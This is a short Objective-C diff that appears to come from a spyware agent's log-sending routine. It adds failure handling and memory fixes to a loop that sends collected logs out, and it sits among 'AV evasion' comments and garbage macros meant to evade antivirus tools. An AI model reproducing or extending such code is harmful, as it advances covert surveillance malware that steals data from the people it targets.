@@ -262,6 +262,7 @@
   AV_GARBAGE_002
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
   __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
   
   //
@@ -306,6 +307,7 @@
       while (anObject = [enumerator nextObject])
         {
           [anObject retain];
+          
           NSString *logName = [[anObject objectForKey: @"logName"] copy];
           
           // AV evasion: only on release build
@@ -324,7 +326,14 @@
               //
               // Send log
               //
-              [self _sendLogContent: logContent];
+              BOOL retVal = [self _sendLogContent: logContent];
+              
+              if (retVal == NO)
+              {
+                [logName release];
+                [anObject release];
+                break;
+              }
               
               // AV evasion: only on release build
               AV_GARBAGE_000
@@ -394,6 +403,8 @@
             
               usleep(300000);
             }
+          
+          [anObject release];
         }
     }
   
